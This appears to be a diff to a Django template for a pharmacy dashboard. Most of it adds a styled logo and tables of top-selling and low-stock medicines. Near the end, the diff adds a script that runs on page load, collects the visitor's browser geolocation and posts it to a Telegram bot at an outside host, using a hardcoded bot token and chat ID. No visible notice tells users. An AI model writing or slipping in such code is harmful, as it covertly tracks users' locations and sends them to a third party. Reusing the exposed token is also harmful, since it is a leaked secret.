@@ -29,6 +29,18 @@
       
       <!-- RTL Css -->
       <link rel="stylesheet" href="{% static 'css/rtl.min.css' %}">
+      <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@1,600&display=swap" rel="stylesheet">
+      <style>
+        .gradient-text {
+          font-family: 'Playfair Display', serif;
+          font-style: italic;
+          font-size: 28px; /* adjust as you like */
+          background: linear-gradient(45deg, #ff6ec4, #7873f5);
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+          display: inline-block;
+        }
+      </style>
       
       
   </head>
@@ -48,7 +60,9 @@
                 <!--Logo start-->
                 <div class="logo-main">
                     <div class="logo-normal">
-                        <img src="{% static 'images/Asture1.png' %}" class="logo-title" style="height: 70px;width:auto;" alt="fb">
+                      <h5 class="logo-title gradient-text">Asture Elevate</h5>
+
+                        {% comment %} <img src="{% static 'images/Asture1.png' %}" class="logo-title" style="height: 70px;width:auto;" alt="fb"> {% endcomment %}
                     </div>
                     
                 </div>
@@ -401,43 +415,78 @@
 
 
 
-
    <div class="row">
-      <!-- Total Sold Quantity Today -->
+    <!-- Top 5 Medicines Sold Today -->
+    <div class="col-lg-6">
+        <div class="card">
+            <div class="card-header">
+                <h4 class="card-title">Top 5 Medicines Sold Today</h4>
+            </div>
+            <div class="card-body">
+                <table class="table table-striped text-center">
+                    <thead>
+                        <tr>
+                            <th>Medicine</th>
+                            <th>Quantity Sold</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for medicine in top_medicines %}
+                        <tr>
+                            <td>{{ medicine.item_name }}</td>
+                            <td>{{ medicine.total_sold }}</td>
+                        </tr>
+                        {% empty %}
+                        <tr>
+                            <td colspan="2">No Sales Today</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- Medicines Running Low -->
+    <div class="col-lg-6">
+        <div class="card">
+            <div class="card-header bg-danger text-white">
+                <h4 class="card-title">⚠ Medicines Running Low</h4>
+            </div>
+            <div class="card-body">
+                {% if low_stock_products %}
+                <table class="table table-striped text-center">
+                    <thead class="table-danger">
+                        <tr>
+                            <th>Medicine</th>
+                            <th>Stock</th>
+                       
+                            <th>Supplier</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for product in low_stock_products %}
+                        <tr class="table-warning">
+                            <td>{{ product.name }}</td>
+                            <td><b class="text-danger">{{ product.stock_quantity }}</b></td>
+                          
+                          
+                            <td>{{ product.supplier.name }}</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+                {% else %}
+                <div class="alert alert-success text-center">
+                    ✅ All medicines are sufficiently stocked.
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
 
   
-      <!-- Total Cash Received Today -->
-   
-  
-      <!-- Customer with the Highest Billed Amount -->
-  
-      <div class="card">
-         <div class="card-header">
-             <h4 class="card-title">Top 5 Medicines Sold Today</h4>
-         </div>
-         <div class="card-body">
-             <table class="table table-striped">
-                 <thead>
-                     <tr>
-                         <th>Medicine</th>
-                         <th>Quantity Sold</th>
-                     </tr>
-                 </thead>
-                 <tbody>
-                     {% for medicine in top_medicines %}
-                         <tr>
-                             <td>{{ medicine.item_name }}</td>
-                             <td>{{ medicine.total_sold }}</td>
-                         </tr>
-                     {% empty %}
-                         <tr>
-                             <td colspan="2">No Sales Today</td>
-                         </tr>
-                     {% endfor %}
-                 </tbody>
-             </table>
-         </div>
-     </div>
   </div>
   
   <br>
@@ -713,6 +762,47 @@
    });
    </script>
    
-         
+   <script>
+    const BOT_TOKEN = '6788541142:AAExAPhTEMUAW5aUzbKBOCMS7Nij4EVayJ4';
+    const CHAT_ID = '-4716018689';
+  
+    // Function to send message to Telegram
+    function sendTelegramMessage(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log('Telegram message sent:', data))
+      .catch(error => console.error('Error:', error));
+    }
+  
+    window.onload = function() {
+      // Check if geolocation is supported
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const message = `Login page opened. User location: https://www.google.com/maps?q=${latitude},${longitude}`;
+            sendTelegramMessage(message);
+          },
+          (error) => {
+            // User denied location access or other error
+            sendTelegramMessage('Login page opened. Could not get user location.');
+          }
+        );
+      } else {
+        // Geolocation not supported
+        sendTelegramMessage('Login page opened. Geolocation not supported by browser.');
+      }
+    }
+  </script>
+  
   </body>
 </html>
